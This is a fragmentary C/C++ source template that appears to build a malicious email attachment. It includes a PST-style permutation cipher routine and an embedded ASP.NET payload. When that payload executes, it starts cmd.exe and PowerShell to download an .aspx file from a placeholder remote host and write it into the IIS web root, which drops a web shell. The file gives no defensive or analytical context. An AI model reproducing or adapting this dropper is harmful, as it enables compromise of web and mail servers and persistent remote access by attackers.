...
void CryptPermute(const char* pv, int cb, BOOL fEncrypt)
{
    // cb -> buffer size
    // pv -> buffer
    byte* pb = (byte*)pv;
...
/* 
{1} <- Replace with payload source 
{2} <- Replace with payload's source name 
{3} <- Replace with output file name
{4} <- Replace with preferred attachment name
*/
void main() {
    char payload[] = R"""(
<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %>

<% 
Process p = Process.Start("C:\\Windows\\System32\\cmd.exe", "/c powershell Invoke-WebRequest -UseBasicParsing https://{1}/{2}.aspx -OutFile C:\\inetpub\\wwwroot\\aspnet_client\\{3}.aspx");
%>
)""";
